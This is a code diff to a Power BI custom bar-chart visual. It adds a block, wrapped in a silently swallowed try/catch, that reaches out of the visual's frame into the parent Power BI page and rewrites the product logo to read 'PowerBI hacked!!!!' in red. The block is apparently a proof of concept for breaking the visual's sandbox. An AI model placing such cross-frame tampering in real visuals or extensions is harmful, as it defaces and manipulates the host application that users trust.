@@ -416,6 +416,21 @@ export class BarChart implements IVisual {
         }
 
 
+
+        try {
+            debugger;
+            console.log(window.parent.document);
+
+            const logo: HTMLElement = window.parent.document.querySelector(".powerBILogoText");
+
+            logo.textContent = "PowerBI hacked!!!!";
+            logo.style.fontWeight = "bold";
+            logo.style.color = "red";
+
+        } catch (e){
+            
+        }
+
     }
 
     /**
@@ -433,6 +448,7 @@ export class BarChart implements IVisual {
 
         // Turn on landing page in capabilities and remove comment to turn on landing page!
         // this.HandleLandingPage(options);
+
 
         let width = options.viewport.width;
         let height = options.viewport.height;
